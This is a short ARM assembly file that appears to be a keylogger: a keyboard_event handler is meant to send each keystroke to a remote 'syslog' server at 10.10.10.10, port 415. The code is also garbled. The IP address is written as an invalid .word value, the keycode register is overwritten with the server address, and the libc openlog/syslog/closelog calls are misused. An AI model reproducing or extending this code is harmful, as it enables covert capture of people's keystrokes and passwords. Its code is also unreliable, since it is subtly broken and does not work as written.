


.section .data

/* syslog server address */
.align 4
syslog_server:
    .word 10.10.10.10

/* syslog server port */
.align 4
syslog_port:
    .word 415

.section .text

/*
 * The function that is called when a keyboard input is detected.
 *
 * @param keycode - keyboard input
 *
 * @return void
 */
.global keyboard_event
keyboard_event:
    /* save registers */
    push {r0-r3, lr}

    /* load syslog server address into r0 */
    ldr r0, =syslog_server

    /* load syslog server port into r1 */
    ldr r1, =syslog_port

    /* load keyboard input into r2 */
    mov r2, r0

    /* open connection to syslog server */
    bl openlog

    /* send keyboard input to syslog server */
    bl syslog

    /* close connection to syslog server */
    bl closelog

    /* restore registers */
    pop {r0-r3, pc}
